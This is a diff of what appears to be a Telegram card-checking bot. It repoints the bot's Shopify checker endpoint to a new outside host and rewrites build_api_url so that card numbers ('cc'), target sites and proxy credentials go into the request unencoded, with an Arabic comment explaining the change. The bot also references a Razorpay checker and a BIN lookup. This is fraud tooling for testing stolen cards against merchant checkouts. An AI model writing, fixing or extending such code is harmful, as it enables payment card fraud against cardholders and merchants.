@@ -106,7 +106,7 @@ FORCE_JOIN_IMAGES = [
     "",
     ""
 ]
-API_BASE_URL = os.getenv("API_BASE_URL", "https://web-production-e6929.up.railway.app/shopify")
+API_BASE_URL = os.getenv("API_BASE_URL", "https://haters.cxchk.site/shopii")
 RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL", "https://rz.rcvan.indevs.in/rz")
 BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
@@ -900,14 +900,20 @@ async def get_bin_info(cn):
 
 # ====================== SHOPIFY API ======================
 def build_api_url(site, cc, proxy_data=None):
-    if not site.startswith('http'): site = f'https://{site}'
-    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
+    if not site.startswith('http'): 
+        site = f'https://{site}'
+        
+    # بناء الرابط بالصيغة المطلوبة بدون استخدام quote لتشفير الرموز
+    url = f'{API_BASE_URL}?site={site}&cc={cc}'
+    
     if proxy_data:
         ip, port = proxy_data['ip'], proxy_data['port']
         un, pw = proxy_data.get('username'), proxy_data.get('password')
         ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
-        url += f'&proxy={quote(ps, safe="")}'
+        url += f'&proxy={ps}'
+        
     return url
+
 
 
 def classify_response(rj):
